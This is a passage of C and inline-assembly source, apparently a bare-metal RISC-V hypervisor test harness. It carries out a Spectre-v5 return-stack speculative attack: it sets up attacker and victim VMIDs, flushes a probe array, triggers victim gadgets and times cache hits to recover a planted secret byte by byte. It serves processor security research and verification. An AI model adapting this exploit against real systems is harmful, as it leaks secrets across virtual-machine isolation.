#include <am.h>
#include <klib.h>
#include <stdint.h>
#include <xsextra.h>

#include "encoding.h"
#include "cache-utils.h"

#ifndef TRAIN_TIMES
#define TRAIN_TIMES 10
#endif

#ifndef ROUNDS
#define ROUNDS 1
#endif

#ifndef ATTACK_SAME_ROUNDS
#define ATTACK_SAME_ROUNDS 2
#endif

#ifndef EARLY_STOP
#define EARLY_STOP 1
#endif

#ifndef EARLY_STOP_MIN_SCORE
#define EARLY_STOP_MIN_SCORE 3
#endif

#ifndef EARLY_STOP_GAP
#define EARLY_STOP_GAP 2
#endif

#ifndef SECRET_SZ
#define SECRET_SZ 6
#endif

#ifndef SECRET_OFFSET
#define SECRET_OFFSET 0
#endif

#ifndef V5_ROUNDS
#define V5_ROUNDS 128
#endif

#ifndef V5_ATTACK_SAME_ROUNDS
#define V5_ATTACK_SAME_ROUNDS ATTACK_SAME_ROUNDS
#endif

#ifndef V5_GADGET_MODE
#define V5_GADGET_MODE 0
#endif

#ifndef V5_TRAIN_PASSES
#define V5_TRAIN_PASSES 8
#endif

#ifndef V5_RAS_DEPTH
#define V5_RAS_DEPTH 24
#endif

#ifndef V5_RAS_FILL_DEPTH
#define V5_RAS_FILL_DEPTH V5_RAS_DEPTH
#endif

#ifndef V5_IN_PLACE_DELAY
#define V5_IN_PLACE_DELAY 128
#endif

#ifndef V5_ADDR_DELAY_REPS
#define V5_ADDR_DELAY_REPS 3
#endif

#ifndef V5_OVERWRITE_VALUE
#define V5_OVERWRITE_VALUE '&'
#endif

#ifndef CACHE_HIT_THRESHOLD
#define CACHE_HIT_THRESHOLD 70
#endif

#ifndef USE_FIXED_CACHE_HIT_THRESHOLD
#define USE_FIXED_CACHE_HIT_THRESHOLD 0
#endif

#ifndef PROBE_CANDIDATES
#define PROBE_CANDIDATES 62
#endif

#ifndef FULL_BYTE_PROBE
#define FULL_BYTE_PROBE 0
#endif


#ifndef CANDIDATE_WINDOW_FLUSH
#define CANDIDATE_WINDOW_FLUSH 0
#endif


#ifndef FLUSH_LINES
#define FLUSH_LINES PROBE_ENTRIES
#endif

#ifndef CONTROL_ONLY
#define CONTROL_ONLY 0
#endif

#ifndef SMOKE_ENTRY_ONLY
#define SMOKE_ENTRY_ONLY 0
#endif

#ifndef SMOKE_AFTER_DIRECT_ONLY
#define SMOKE_AFTER_DIRECT_ONLY 0
#endif

#ifndef SMOKE_AFTER_FLUSH_ONLY
#define SMOKE_AFTER_FLUSH_ONLY 0
#endif

#ifndef SMOKE_BEFORE_VICTIM_ONLY
#define SMOKE_BEFORE_VICTIM_ONLY 0
#endif

#ifndef SMOKE_AFTER_ATTACK_FLUSH_ONLY
#define SMOKE_AFTER_ATTACK_FLUSH_ONLY 0
#endif

#ifndef SMOKE_AFTER_FIRST_VICTIM_ONLY
#define SMOKE_AFTER_FIRST_VICTIM_ONLY 0
#endif

#ifndef SMOKE_AFTER_TRAINING_ONLY
#define SMOKE_AFTER_TRAINING_ONLY 0
#endif

#ifndef SMOKE_AFTER_PROBE_ONLY
#define SMOKE_AFTER_PROBE_ONLY 0
#endif

#ifndef SMOKE_TRACE
#define SMOKE_TRACE 0
#endif

#ifndef SMOKE_FAST_BOOT
#define SMOKE_FAST_BOOT 0
#endif

#ifndef ATTACKER_VMID
#define ATTACKER_VMID 17u
#endif

#ifndef VICTIM_VMID
#define VICTIM_VMID 23u
#endif

#define VMID14(x) ((x) & 0x3fffu)

#if VMID14(ATTACKER_VMID) == 0 || VMID14(VICTIM_VMID) == 0
#error "ATTACKER_VMID and VICTIM_VMID must be non-zero after 14-bit normalization"
#endif

#if VMID14(ATTACKER_VMID) == VMID14(VICTIM_VMID)
#error "ATTACKER_VMID and VICTIM_VMID must differ after 14-bit normalization"
#endif

#ifndef FENCE_ON_VMID_SWITCH
#define FENCE_ON_VMID_SWITCH 0
#endif

#define PROBE_ENTRIES 256u
#define PROBE_STRIDE L1_BLOCK_SZ_BYTES
_Static_assert(PROBE_STRIDE == 64, "victim_process_gadget assumes 64-byte probe stride");

#define SVC_VICTIM 1u
#define SVC_FLUSH_PROBE 2u
#define SVC_EXIT 3u
#define SVC_VICTIM_DONE 4u

#define MCAUSE_USER_ECALL 8u
#define MCAUSE_VIRTUAL_SUPERVISOR_ECALL 10u
#define MCAUSE_LOAD_ACCESS_FAULT 5u
#define MCAUSE_LOAD_PAGE_FAULT 13u
#define MSTATUS_MPP_MASK (3ull << 11)
#define MSTATUS_MPRV_BIT (1ull << 17)
#define MSTATUS_MPV (1ull << 39)

#define PAGE_SHIFT 12u
#define PAGE_SIZE (1ull << PAGE_SHIFT)
#define PTES_PER_PT 512u
#define PT_L2_PAGES 4u
#define PT_L1_PAGES 16u
#define PT_L0_PAGES 64u
#define SATP_MODE_SV48 (9ull << 60)
#define HGATP_MODE_BARE 0ull
#define HGATP_VMID_SHIFT 44u
#define HGATP_VMID_MASK (0x3fffull << HGATP_VMID_SHIFT)
#define VPTE_V (1ull << 0)
#define VPTE_R (1ull << 1)
#define VPTE_W (1ull << 2)
#define VPTE_X (1ull << 3)
#define VPTE_U (1ull << 4)
#define VPTE_A (1ull << 6)
#define VPTE_D (1ull << 7)

#define PUBLIC_ARRAY1_SZ 16u
#define U_TEXT __attribute__((section(".u_text"), noinline, aligned(16)))
#define A_DATA __attribute__((section(".a_data"), aligned(4096)))
#define V_DATA __attribute__((section(".v_data"), aligned(4096)))
#define SHARED_DATA __attribute__((section(".shared_data"), aligned(4096)))

asm(
    ".section .u_text,\"ax\",@progbits\n"
    ".balign 4096\n"
    ".globl __u_text_start\n"
    "__u_text_start:\n"
    ".previous\n");

asm(
    ".section .a_data,\"aw\",@progbits\n"
    ".balign 4096\n"
    ".globl __a_data_start\n"
    "__a_data_start:\n"
    ".previous\n");

static uint8_t A_DATA attacker_stack[16 * 1024];
static uint8_t A_DATA leaked_idx[SECRET_SZ][2];
static uint64_t A_DATA leaked_score[SECRET_SZ][2];
static uint64_t A_DATA rounds_used[SECRET_SZ];
static uint64_t A_DATA active_threshold;
static volatile uint64_t A_DATA direct_victim_fault_expected;
static volatile uint64_t A_DATA direct_victim_fault_seen;
static volatile uint64_t A_DATA direct_victim_read_completed;
static volatile uint64_t A_DATA direct_victim_read_value;

asm(
    ".section .shared_data,\"aw\",@progbits\n"
    ".balign 4096\n"
    ".globl __shared_data_start\n"
    "__shared_data_start:\n"
    ".previous\n");

static uint8_t SHARED_DATA shared_probe[PROBE_ENTRIES * PROBE_STRIDE];
static volatile uint8_t SHARED_DATA m_dummy;

asm(
    ".section .v_data,\"aw\",@progbits\n"
    ".balign 4096\n"
    ".globl __v_data_start\n"
    "__v_data_start:\n"
    ".previous\n");

struct victim_region {
  uint8_t array1[16];
  uint8_t pad[64];
  uint8_t secret[16];
} __attribute__((packed, aligned(64)));

static struct victim_region V_DATA victim_region = {
  .array1 = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16},
  .secret = "S3CreT",
};
static volatile uint64_t V_DATA victim_array1_sz = PUBLIC_ARRAY1_SZ;
static volatile uint64_t V_DATA victim_str_index = 1;
static volatile uint64_t V_DATA victim_temp;
static volatile uint8_t V_DATA victim_dummy = 2;
static volatile uint64_t V_DATA victim_str[256];
static volatile uint64_t V_DATA victim_arg_idx;
static volatile uintptr_t V_DATA victim_arg_probe;
static uint8_t V_DATA victim_stack[16 * 1024];

static volatile uint64_t trap_count;
static volatile uint64_t victim_call_count;
static volatile uint64_t victim_done_count;
static volatile uint64_t flush_call_count;
static volatile uint64_t exit_call_count;
static volatile uint64_t bad_trap_count;
static volatile uint64_t last_mcause;
static volatile uint64_t last_mepc;
static volatile int attack_done;
static volatile int attack_status;
static volatile int victim_trap_return_to_machine;
static uintptr_t saved_main_m_sp;
static uintptr_t saved_victim_m_sp __attribute__((used));
static uint8_t m_stack[16 * 1024] __attribute__((aligned(16)));
static volatile uintptr_t observed_attacker_vsatp;
static volatile uintptr_t observed_victim_vsatp;
static volatile uintptr_t observed_attacker_hgatp;
static volatile uintptr_t observed_victim_hgatp;
static volatile uintptr_t attacker_vsatp_for_trap;
static volatile uintptr_t attacker_hgatp_for_trap;
static volatile uintptr_t current_trap_frame_sp;
static volatile uintptr_t saved_attacker_trap_sp;
static volatile uintptr_t saved_attacker_mscratch;
static volatile uintptr_t resume_attacker_epc;

struct page_space {
  uint64_t root[PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
  uint64_t l2[PT_L2_PAGES][PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
  uint64_t l1[PT_L1_PAGES][PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
  uint64_t l0[PT_L0_PAGES][PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
  uint64_t l2_used;
  uint64_t l1_used;
  uint64_t l0_used;
  uint64_t vmid;
  uintptr_t satp;
  uintptr_t hgatp;
} __attribute__((aligned(PAGE_SIZE)));

static struct page_space attacker_space;
static struct page_space victim_space;

extern char __u_text_start[];
extern char __u_text_end[];
extern char __a_data_start[];
extern char __a_data_end[];
extern char __shared_data_start[];
extern char __shared_data_end[];
extern char __v_data_start[];
extern char __v_data_end[];
extern void xs_v5_recursive_ret_probe(const uint8_t *secret_ptr,
                                      volatile uint8_t *probe);

static inline uintptr_t page_down(uintptr_t addr)
{
  return addr & ~(uintptr_t)(PAGE_SIZE - 1);
}

static inline uintptr_t page_up(uintptr_t addr)
{
  return (addr + PAGE_SIZE - 1) & ~(uintptr_t)(PAGE_SIZE - 1);
}

static void zero_page(void *page)
{
  uint64_t *p = (uint64_t *)page;
  for (uint64_t i = 0; i < PTES_PER_PT; ++i)
    p[i] = 0;
}

static int alloc_l2(struct page_space *space)
{
  if (space->l2_used >= PT_L2_PAGES)
    return -1;
  zero_page(space->l2[space->l2_used]);
  return (int)space->l2_used++;
}

static int alloc_l1(struct page_space *space)
{
  if (space->l1_used >= PT_L1_PAGES)
    return -1;
  zero_page(space->l1[space->l1_used]);
  return (int)space->l1_used++;
}

static int alloc_l0(struct page_space *space)
{
  if (space->l0_used >= PT_L0_PAGES)
    return -1;
  zero_page(space->l0[space->l0_used]);
  return (int)space->l0_used++;
}

static uint64_t *walk_page(struct page_space *space, uintptr_t va, int alloc)
{
  uintptr_t vpn3 = (va >> 39) & 0x1ffu;
  uintptr_t vpn2 = (va >> 30) & 0x1ffu;
  uintptr_t vpn1 = (va >> 21) & 0x1ffu;
  uintptr_t vpn0 = (va >> 12) & 0x1ffu;
  uint64_t *l2;
  uint64_t *l1;
  uint64_t *l0;
  int idx;

  if ((space->root[vpn3] & VPTE_V) == 0) {
    if (!alloc)
      return NULL;
    idx = alloc_l2(space);
    if (idx < 0)
      return NULL;
    space->root[vpn3] =
        (((uintptr_t)space->l2[idx] >> PAGE_SHIFT) << 10) | VPTE_V;
  }
  l2 = (uint64_t *)(((space->root[vpn3] >> 10) << PAGE_SHIFT));

  if ((l2[vpn2] & VPTE_V) == 0) {
    if (!alloc)
      return NULL;
    idx = alloc_l1(space);
    if (idx < 0)
      return NULL;
    l2[vpn2] = (((uintptr_t)space->l1[idx] >> PAGE_SHIFT) << 10) | VPTE_V;
  }
  l1 = (uint64_t *)(((l2[vpn2] >> 10) << PAGE_SHIFT));

  if ((l1[vpn1] & VPTE_V) == 0) {
    if (!alloc)
      return NULL;
    idx = alloc_l0(space);
    if (idx < 0)
      return NULL;
    l1[vpn1] = (((uintptr_t)space->l0[idx] >> PAGE_SHIFT) << 10) | VPTE_V;
  }
  l0 = (uint64_t *)(((l1[vpn1] >> 10) << PAGE_SHIFT));
  return &l0[vpn0];
}

static int map_identity_page(struct page_space *space, uintptr_t va, uint64_t perm)
{
  uint64_t *pte = walk_page(space, va, 1);
  if (pte == NULL)
    return -1;
  *pte = ((va >> PAGE_SHIFT) << 10) | VPTE_V | VPTE_A | perm |
         ((perm & VPTE_W) ? VPTE_D : 0);
  return 0;
}

static int map_identity_range(struct page_space *space, uintptr_t start,
                              uintptr_t end, uint64_t perm)
{
  uintptr_t cur = page_down(start);
  uintptr_t limit = page_up(end);
  for (; cur < limit; cur += PAGE_SIZE) {
    if (map_identity_page(space, cur, perm) != 0)
      return -1;
  }
  return 0;
}

static void init_page_space(struct page_space *space, uint64_t vmid)
{
  zero_page(space->root);
  space->l2_used = 0;
  space->l1_used = 0;
  space->l0_used = 0;
  space->vmid = VMID14(vmid);
  space->satp = SATP_MODE_SV48 | (((uintptr_t)space->root) >> PAGE_SHIFT);
  space->hgatp = HGATP_MODE_BARE | (space->vmid << HGATP_VMID_SHIFT);
}

static inline uintptr_t switch_vsatp(uintptr_t vsatp, int flush)
{
  uintptr_t observed;

  asm volatile("csrw vsatp, %0" :: "r"(vsatp) : "memory");
  if (flush)
    asm volatile(
        ".option push\n"
        ".option arch, +h\n"
        "hfence.vvma x0, x0\n"
        ".option pop\n"
        ::: "memory");
  asm volatile("fence.i\ncsrr %0, vsatp" : "=r"(observed) :: "memory");
  return observed;
}

static inline uintptr_t switch_hgatp(uintptr_t hgatp, int flush)
{
  uintptr_t observed;

  asm volatile("csrw hgatp, %0" :: "r"(hgatp) : "memory");
  if (flush)
    asm volatile(
        ".option push\n"
        ".option arch, +h\n"
        "hfence.gvma x0, x0\n"
        "hfence.vvma x0, x0\n"
        ".option pop\n"
        ::: "memory");
  asm volatile("fence.i\ncsrr %0, hgatp" : "=r"(observed) :: "memory");
  return observed;
}

static void install_vmid_page_tables(void)
{
  init_page_space(&attacker_space, ATTACKER_VMID);
  init_page_space(&victim_space, VICTIM_VMID);
  attacker_vsatp_for_trap = attacker_space.satp;
  attacker_hgatp_for_trap = attacker_space.hgatp;

  if (map_identity_range(&attacker_space, (uintptr_t)__u_text_start,
                         (uintptr_t)__u_text_end, VPTE_R | VPTE_X) != 0)
    panic("map attacker u_text failed");
  if (map_identity_range(&victim_space, (uintptr_t)__u_text_start,
                         (uintptr_t)__u_text_end, VPTE_R | VPTE_X) != 0)
    panic("map victim u_text failed");
  if (map_identity_range(&attacker_space,
                         page_down((uintptr_t)xs_v5_recursive_ret_probe),
                         (uintptr_t)__u_text_start, VPTE_R | VPTE_X) != 0)
    panic("map attacker v5 gadget failed");
  if (map_identity_range(&victim_space,
                         page_down((uintptr_t)xs_v5_recursive_ret_probe),
                         (uintptr_t)__u_text_start, VPTE_R | VPTE_X) != 0)
    panic("map victim v5 gadget failed");
  if (map_identity_range(&attacker_space, (uintptr_t)__a_data_start,
                         (uintptr_t)__a_data_end, VPTE_R | VPTE_W) != 0)
    panic("map attacker data failed");
  if (map_identity_range(&attacker_space, (uintptr_t)__shared_data_start,
                         (uintptr_t)__shared_data_end, VPTE_R | VPTE_W) != 0)
    panic("map attacker shared data failed");
  if (map_identity_range(&victim_space, (uintptr_t)__shared_data_start,
                         (uintptr_t)__shared_data_end, VPTE_R | VPTE_W) != 0)
    panic("map victim shared data failed");
  if (map_identity_range(&victim_space, (uintptr_t)__v_data_start,
                         (uintptr_t)__v_data_end, VPTE_R | VPTE_W) != 0)
    panic("map victim data failed");
}

static U_TEXT __attribute__((unused)) uint64_t candidate_value(uint64_t idx)
{
  if (idx < 10)
    return '0' + idx;
  if (idx < 36)
    return 'A' + (idx - 10);
  return 'a' + (idx - 36);
}

static U_TEXT uint64_t candidate_probe_value(uint64_t idx)
{
#if FULL_BYTE_PROBE
  return ((idx * 167u) + 13u) & 255u;
#elif defined(CANDIDATE_BASE)
  return ((uint64_t)CANDIDATE_BASE + (idx % PROBE_CANDIDATES)) & 255u;
#else
  return candidate_value((idx * 17u + 13u) % 62u);
#endif
}

static U_TEXT __attribute__((unused)) int is_training_value(uint64_t value)
{
  for (uint64_t i = 1; i <= PUBLIC_ARRAY1_SZ; ++i) {
    if (value == i)
      return 1;
  }
  return 0;
}

static U_TEXT void top_two_idx(uint64_t *in, uint64_t count,
                               uint8_t out_idx[2], uint64_t out_score[2])
{
  out_idx[0] = 0;
  out_idx[1] = 0;
  out_score[0] = 0;
  out_score[1] = 0;

  for (uint64_t i = 0; i < count; ++i) {
    if (in[i] > out_score[0]) {
      out_score[1] = out_score[0];
      out_idx[1] = out_idx[0];
      out_score[0] = in[i];
      out_idx[0] = i;
    } else if (in[i] > out_score[1]) {
      out_score[1] = in[i];
      out_idx[1] = i;
    }
  }
}

static U_TEXT int enough_confidence(uint64_t *results)
{
  uint8_t idx[2];
  uint64_t score[2];

  top_two_idx(results, PROBE_ENTRIES, idx, score);
  (void)idx;
  return score[0] >= EARLY_STOP_MIN_SCORE &&
         score[0] >= score[1] + EARLY_STOP_GAP;
}

static U_TEXT uint64_t u_probe_time(volatile uint8_t *addr)
{
  uint64_t start;
  uint64_t end;
  uint8_t dummy;

  asm volatile(
      "fence rw, rw\n"
      "rdcycle %[start]\n"
      "lbu %[dummy], 0(%[addr])\n"
      "fence rw, rw\n"
      "rdcycle %[end]\n"
      : [start] "=&r"(start), [end] "=&r"(end), [dummy] "=&r"(dummy)
      : [addr] "r"(addr)
      : "memory");
  (void)dummy;
  return end - start;
}

static U_TEXT void probe_direct_victim_access(void)
{
  uint64_t value = 0;

  direct_victim_fault_seen = 0;
  direct_victim_read_completed = 0;
  direct_victim_read_value = 0;
  direct_victim_fault_expected = 1;
  asm volatile("lbu %0, 0(%1)" : "=&r"(value) : "r"(victim_region.secret) : "memory");
  direct_victim_fault_expected = 0;
  if (!direct_victim_fault_seen) {
    direct_victim_read_value = value;
    direct_victim_read_completed = 1;
  }
}

static void flush_probe_service(uint8_t *probe)
{
#if CANDIDATE_WINDOW_FLUSH && defined(CANDIDATE_BASE)
  for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i) {
    uint64_t mixed_i = candidate_probe_value(i);
    xs_flush_cache_line(&probe[mixed_i * PROBE_STRIDE]);
  }
#else
  for (uint64_t i = 0; i < FLUSH_LINES; ++i)
    xs_flush_cache_line(&probe[i * PROBE_STRIDE]);
#endif

  xs_flush_cache_line((void *)&victim_array1_sz);
  xs_flush_cache_line((void *)&victim_str[1]);
  xs_flush_cache_line((void *)&victim_str_index);
  xs_fence();
}

extern void xs_v5_recursive_ret_probe(const uint8_t *secret_ptr,
                                      volatile uint8_t *probe);
extern void xs_v5_loop_ret_probe(const uint8_t *secret_ptr,
                                 volatile uint8_t *probe);
extern void xs_v5_frame_dump_probe(const uint8_t *secret_ptr,
                                   volatile uint8_t *probe);
extern void xs_v5_fill_ras(void);

static U_TEXT __attribute__((noinline)) void xs_v5_sonicboom_spec_func(
    const uint8_t *secret_ptr, volatile uint8_t *probe)
{
  uint8_t value = *((volatile const uint8_t *)secret_ptr);
  uint8_t loaded = probe[(uint64_t)value * PROBE_STRIDE];
  victim_temp += loaded;
  m_dummy ^= loaded;
}

static U_TEXT __attribute__((noinline)) void victim_process_gadget(uint64_t idx,
                                                                   volatile uint8_t *probe)
{
  xs_v5_fill_ras();
  uint64_t secret_idx = idx;
  uint64_t cycle;

  if (secret_idx >= sizeof(victim_region.secret) - 1)
    secret_idx %= sizeof(victim_region.secret) - 1;

  const uint8_t *secret_ptr = (const uint8_t *)&victim_region.secret[secret_idx];
#if V5_FLUSH_SECRET
  xs_flush_cache_line((void *)secret_ptr);
#endif
  xs_fence();

#if V5_GADGET_MODE == 2
  xs_v5_sonicboom_spec_func(secret_ptr, probe);
#elif V5_GADGET_MODE == 1
  xs_v5_loop_ret_probe(secret_ptr, probe);
#elif V5_GADGET_MODE == 3
  xs_v5_frame_dump_probe(secret_ptr, probe);
  asm volatile("ld fp, -16(sp)" ::: "memory");
  uint8_t value = *((volatile const uint8_t *)secret_ptr);
  uint8_t loaded = probe[(uint64_t)value * PROBE_STRIDE];
  victim_temp += loaded;
  m_dummy ^= loaded;
#else
  xs_v5_recursive_ret_probe(secret_ptr, probe);
#endif

  asm volatile("rdcycle %0" : "=r"(cycle));
  victim_dummy ^= (uint8_t)cycle;
}

static U_TEXT __attribute__((noreturn, unused)) void victim_process_entry(void)
{
  victim_process_gadget(victim_arg_idx, (volatile uint8_t *)victim_arg_probe);

  register uint64_t a7 asm("a7") = SVC_VICTIM_DONE;
  asm volatile("ecall" :: "r"(a7) : "memory");
  for (;;)
    asm volatile("wfi");
}

static void run_victim_process(uint64_t idx, volatile uint8_t *probe)
{
  uintptr_t victim_sp = (uintptr_t)victim_stack + sizeof(victim_stack) - 16;
  uintptr_t machine_sp = (uintptr_t)m_stack + (sizeof(m_stack) / 2) - 16;
  uintptr_t saved_mscratch;
  uintptr_t mstatus;

  victim_arg_idx = idx;
  victim_arg_probe = (uintptr_t)probe;
  victim_trap_return_to_machine = 0;

  asm volatile("csrr %0, mscratch" : "=r"(saved_mscratch));
  observed_victim_hgatp = switch_hgatp(victim_space.hgatp, FENCE_ON_VMID_SWITCH);
  observed_victim_vsatp = switch_vsatp(victim_space.satp, FENCE_ON_VMID_SWITCH);
  asm volatile("csrr %0, mstatus" : "=r"(mstatus));
  mstatus = (mstatus & ~(MSTATUS_MPP_MASK | MSTATUS_MPV | MSTATUS_MPRV_BIT)) |
            MSTATUS_MPV | MSTATUS_FS | (1ull << 11);

  asm volatile(
      "la t0, saved_victim_m_sp\n"
      "sd sp, 0(t0)\n"
      "csrw mscratch, %[machine_sp]\n"
      "mv sp, %[victim_sp]\n"
      "csrs vsstatus, %[vsstatus_fs]\n"
      "csrw mstatus, %[mstatus]\n"
      "csrw mepc, %[entry]\n"
      "mret\n"
      ".globl victim_machine_return\n"
      "victim_machine_return:\n"
      "la t0, saved_victim_m_sp\n"
      "ld sp, 0(t0)\n"
      :
      : [machine_sp] "r"(machine_sp),
        [victim_sp] "r"(victim_sp),
        [vsstatus_fs] "r"(MSTATUS_FS),
        [mstatus] "r"(mstatus),
        [entry] "r"((uintptr_t)victim_process_entry)
      : "t0", "memory");

  asm volatile("csrw mscratch, %0" :: "r"(saved_mscratch) : "memory");
  observed_attacker_hgatp = switch_hgatp(attacker_space.hgatp, FENCE_ON_VMID_SWITCH);
  observed_attacker_vsatp = switch_vsatp(attacker_space.satp, FENCE_ON_VMID_SWITCH);
}

void m_trap_dispatch(uint64_t cause, uint64_t epc,
                     uint64_t a0, uint64_t a1, uint64_t a7)
{
  trap_count++;
  last_mcause = cause;
  last_mepc = epc;

  if ((cause == MCAUSE_LOAD_ACCESS_FAULT || cause == MCAUSE_LOAD_PAGE_FAULT) &&
      direct_victim_fault_expected != 0) {
    direct_victim_fault_seen = 1;
    direct_victim_fault_expected = 0;
    return;
  }

  if (cause != MCAUSE_VIRTUAL_SUPERVISOR_ECALL) {
    bad_trap_count++;
    attack_status = 2;
    attack_done = 1;
    return;
  }

  if (a7 == SVC_VICTIM) {
    victim_call_count++;
    resume_attacker_epc = epc + 4;
    saved_attacker_trap_sp = current_trap_frame_sp;
    asm volatile("csrr %0, mscratch" : "=r"(saved_attacker_mscratch));
    run_victim_process(a0, (volatile uint8_t *)a1);
  } else if (a7 == SVC_VICTIM_DONE) {
    victim_done_count++;
    victim_trap_return_to_machine = 1;
  } else if (a7 == SVC_FLUSH_PROBE) {
    flush_call_count++;
    flush_probe_service((uint8_t *)a0);
  } else if (a7 == SVC_EXIT) {
    exit_call_count++;
    attack_status = (int)a0;
    attack_done = 1;
  } else {
    bad_trap_count++;
    attack_status = 3;
    attack_done = 1;
  }
}

void m_trap_entry(void);
asm(
    ".section .text\n"
    ".align 2\n"
    ".globl m_trap_entry\n"
    "m_trap_entry:\n"
    "  csrrw sp, mscratch, sp\n"
    "  addi sp, sp, -160\n"
    "  sd ra, 0(sp)\n"
    "  sd t0, 8(sp)\n"
    "  sd t1, 16(sp)\n"
    "  sd t2, 24(sp)\n"
    "  la t0, current_trap_frame_sp\n"
    "  sd sp, 0(t0)\n"
    "  sd a0, 32(sp)\n"
    "  sd a1, 40(sp)\n"
    "  sd a2, 48(sp)\n"
    "  sd a3, 56(sp)\n"
    "  sd a4, 64(sp)\n"
    "  sd a5, 72(sp)\n"
    "  sd a6, 80(sp)\n"
    "  sd a7, 88(sp)\n"
    "  csrr a0, mcause\n"
    "  csrr a1, mepc\n"
    "  ld a2, 32(sp)\n"
    "  ld a3, 40(sp)\n"
    "  ld a4, 88(sp)\n"
    "  call m_trap_dispatch\n"
    "  la t0, victim_trap_return_to_machine\n"
    "  lw t1, 0(t0)\n"
    "  bnez t1, 2f\n"
    "  la t0, attack_done\n"
    "  lw t1, 0(t0)\n"
    "  bnez t1, 3f\n"
    "  csrr t0, mepc\n"
    "  addi t0, t0, 4\n"
    "  csrw mepc, t0\n"
    "1:\n"
    "  ld ra, 0(sp)\n"
    "  ld t0, 8(sp)\n"
    "  ld t1, 16(sp)\n"
    "  ld t2, 24(sp)\n"
    "  ld a0, 32(sp)\n"
    "  ld a1, 40(sp)\n"
    "  ld a2, 48(sp)\n"
    "  ld a3, 56(sp)\n"
    "  ld a4, 64(sp)\n"
    "  ld a5, 72(sp)\n"
    "  ld a6, 80(sp)\n"
    "  ld a7, 88(sp)\n"
    "  addi sp, sp, 160\n"
    "  csrrw sp, mscratch, sp\n"
    "  mret\n"
    "2:\n"
    "  sw zero, 0(t0)\n"
    "  la t0, saved_attacker_mscratch\n"
    "  ld t1, 0(t0)\n"
    "  csrw mscratch, t1\n"
    "  la t0, attacker_hgatp_for_trap\n"
    "  ld t1, 0(t0)\n"
    "  csrw hgatp, t1\n"
    "  fence.i\n"
    "  csrr t1, hgatp\n"
    "  la t0, observed_attacker_hgatp\n"
    "  sd t1, 0(t0)\n"
    "  la t0, attacker_vsatp_for_trap\n"
    "  ld t1, 0(t0)\n"
    "  csrw vsatp, t1\n"
    "  fence.i\n"
    "  csrr t1, vsatp\n"
    "  la t0, observed_attacker_vsatp\n"
    "  sd t1, 0(t0)\n"
    "  la t0, resume_attacker_epc\n"
    "  ld t1, 0(t0)\n"
    "  csrw mepc, t1\n"
    "  li t0, 0x8000021800\n"
    "  csrc mstatus, t0\n"
    "  li t0, 0x8000000800\n"
    "  csrs mstatus, t0\n"
    "  la t0, saved_attacker_trap_sp\n"
    "  ld sp, 0(t0)\n"
    "  ld ra, 0(sp)\n"
    "  ld t0, 8(sp)\n"
    "  ld t1, 16(sp)\n"
    "  ld t2, 24(sp)\n"
    "  ld a0, 32(sp)\n"
    "  ld a1, 40(sp)\n"
    "  ld a2, 48(sp)\n"
    "  ld a3, 56(sp)\n"
    "  ld a4, 64(sp)\n"
    "  ld a5, 72(sp)\n"
    "  ld a6, 80(sp)\n"
    "  ld a7, 88(sp)\n"
    "  addi sp, sp, 160\n"
    "  csrrw sp, mscratch, sp\n"
    "  mret\n"
    "3:\n"
    "  la t0, attack_done\n"
    "  sw zero, 0(t0)\n"
    "  la t0, machine_low_return\n"
    "  csrw mepc, t0\n"
    "  li t0, 0x8000021800\n"
    "  csrc mstatus, t0\n"
    "  li t0, 0x1800\n"
    "  csrs mstatus, t0\n"
    "  ld ra, 0(sp)\n"
    "  ld t0, 8(sp)\n"
    "  ld t1, 16(sp)\n"
    "  ld t2, 24(sp)\n"
    "  ld a0, 32(sp)\n"
    "  ld a1, 40(sp)\n"
    "  ld a2, 48(sp)\n"
    "  ld a3, 56(sp)\n"
    "  ld a4, 64(sp)\n"
    "  ld a5, 72(sp)\n"
    "  ld a6, 80(sp)\n"
    "  ld a7, 88(sp)\n"
    "  addi sp, sp, 160\n"
    "  la t0, machine_low_return\n"
    "  jr t0\n");

static U_TEXT void svc_victim(uint64_t idx, volatile uint8_t *probe)
{
  register uint64_t a0 asm("a0") = idx;
  register uint64_t a1 asm("a1") = (uint64_t)probe;
  register uint64_t a7 asm("a7") = SVC_VICTIM;
  asm volatile("ecall" : "+r"(a0) : "r"(a1), "r"(a7) : "memory");
}

static U_TEXT void svc_flush_probe(volatile uint8_t *probe)
{
  register uint64_t a0 asm("a0") = (uint64_t)probe;
  register uint64_t a7 asm("a7") = SVC_FLUSH_PROBE;
  asm volatile("ecall" : "+r"(a0) : "r"(a7) : "memory");
}

static U_TEXT void svc_exit(uint64_t status)
{
  register uint64_t a0 asm("a0") = status;
  register uint64_t a7 asm("a7") = SVC_EXIT;
  asm volatile("ecall" : "+r"(a0) : "r"(a7) : "memory");
  __builtin_unreachable();
}

static U_TEXT int attacker_run(void)
{
#if CONTROL_ONLY
  probe_direct_victim_access();
  svc_flush_probe(shared_probe);
  svc_victim(SECRET_OFFSET, shared_probe);
  return 0;
#endif

  probe_direct_victim_access();

  for (uint64_t len = 0; len < SECRET_SZ; ++len) {
    uint64_t results[PROBE_ENTRIES];
    for (uint64_t i = 0; i < PROBE_ENTRIES; ++i)
      results[i] = 0;

    for (uint64_t atk_round = 0; atk_round < V5_ROUNDS; ++atk_round) {
      for (uint64_t same_round = 0; same_round < V5_ATTACK_SAME_ROUNDS;
           ++same_round) {
        svc_flush_probe(shared_probe);
        svc_victim(SECRET_OFFSET + len, shared_probe);

        for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i) {
          uint64_t mixed_i = candidate_probe_value(i);
          uint64_t elapsed = u_probe_time(&shared_probe[mixed_i * PROBE_STRIDE]);
          if (elapsed < active_threshold)
            results[mixed_i]++;
        }
      }

      rounds_used[len] = atk_round + 1;
#if EARLY_STOP
      if (enough_confidence(results))
        break;
#endif
    }

    top_two_idx(results, PROBE_ENTRIES, leaked_idx[len], leaked_score[len]);
  }

  return 0;
}

static U_TEXT __attribute__((noreturn, unused)) void attacker_entry(void)
{
#if SMOKE_ENTRY_ONLY
  svc_exit(0x11);
#else
  svc_exit((uint64_t)attacker_run());
#endif
  for (;;)
    asm volatile("wfi");
}

static void enter_attacker_process(void)
{
  uintptr_t user_sp = (uintptr_t)attacker_stack + sizeof(attacker_stack) - 16;
  uintptr_t machine_sp = (uintptr_t)m_stack + sizeof(m_stack) - 16;
  uintptr_t mstatus;

